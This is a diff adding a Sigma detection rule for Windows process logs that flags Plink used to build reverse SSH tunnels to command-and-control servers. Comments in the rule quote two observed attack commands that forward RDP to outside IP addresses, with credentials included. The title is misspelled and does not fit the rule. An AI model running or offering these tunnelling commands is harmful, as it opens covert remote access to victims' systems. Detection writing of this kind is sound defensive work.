@@ -1,0 +1,51 @@
+title: CHEK_ALT_TRANSLETE
+status: stable
+description: Adversaries may use the Plink command-line utility to create tunnels to own C2 servers.
+references:
+  - https://www.rapid7.com/blog/post/2023/01/19/etr-cve-2022-47966-rapid7-observed-exploitation-of-critical-manageengine-vulnerability/
+  - https://documentation.help/PuTTY/using-general-opts.html#S3.8.3
+tags:
+  - attack.command_and_control
+  - attack.t1572
+author: SOC Prime Team
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection_win_scope:
+    Image|endswith:
+      - '.exe'
+  selection_bin:
+    Image|endswith:
+      - 'plink.exe'
+  selection_args_combos:
+    - CommandLine|contains|all:
+      - '-N ' #plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 148.251.71.182 -P 22 -l forward -pw Socks@123 -no-antispoof
+      - '-T '
+    - CommandLine|contains|all:
+      - '-P '
+      - '-R '
+    - CommandLine|contains|all:
+      - '3389' #RDP forward patterns
+      - '-P '
+      - '-R '
+    - CommandLine|contains|all:
+      - '22 ' #SSH forward patterns
+      - '-P '
+      - '-R '
+    - CommandLine|contains:
+      - ' forward '
+      - '-pw ' #echo y|C:\windows\temp\ekern.exe -ssh -P 443 -l admin1 -pw Asde345@#$345sdfDFVCDF -R 23.81.246.84:49800:10.X.X.X:3389 23.81.246.84
+      - 'antispoof'
+      - 'sshlog'
+      - 'sshrawlog'
+      - 'proxycdsfdsdrmd'
+      - 'restrict-acl'
+  filters:
+    Image|contains:
+      - '\Program Files'
+      - 'DriverStore'
+  condition: (selection_bin or (selection_win_scope and selection_args_combos)) and not filters
+falsepositives:
+  - Plink usage by administrators.
+level: medium
